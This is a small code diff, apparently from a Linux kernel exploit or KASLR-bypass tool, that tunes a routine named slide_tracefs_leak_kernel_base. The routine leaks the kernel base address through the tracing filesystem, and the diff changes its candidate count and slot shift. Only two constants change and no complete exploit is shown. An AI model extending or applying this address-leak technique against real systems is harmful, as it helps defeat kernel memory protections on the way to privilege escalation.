@@ -203,7 +203,7 @@ static const uint64_t slide_max_offset = 0x3f8000ULL;
 
 #if defined(APP_TRACEFS_SLIDE) && APP_TRACEFS_SLIDE
 #define SLIDE_TRACEFS_ROOT "/sys/kernel/tracing"
-#define SLIDE_TRACEFS_CANDIDATES 1048576
+#define SLIDE_TRACEFS_CANDIDATES (1u << 22)
 static unsigned int slide_tracefs_raw_pages;
 static unsigned int slide_tracefs_raw_bytes;
 static unsigned int slide_tracefs_raw_events;
@@ -627,7 +627,7 @@ static int slide_tracefs_leak_kernel_base(void) {
     if (!slide_tracefs_candidate_hits[slot]) {
       continue;
     }
-    uintptr_t slot_candidate = slot << 21;
+    uintptr_t slot_candidate = slot << 16;
     pr_info("slide tracefs candidate=%08zx hits=%u\n",
             slot_candidate, slide_tracefs_candidate_hits[slot]);
     candidate = slot_candidate;
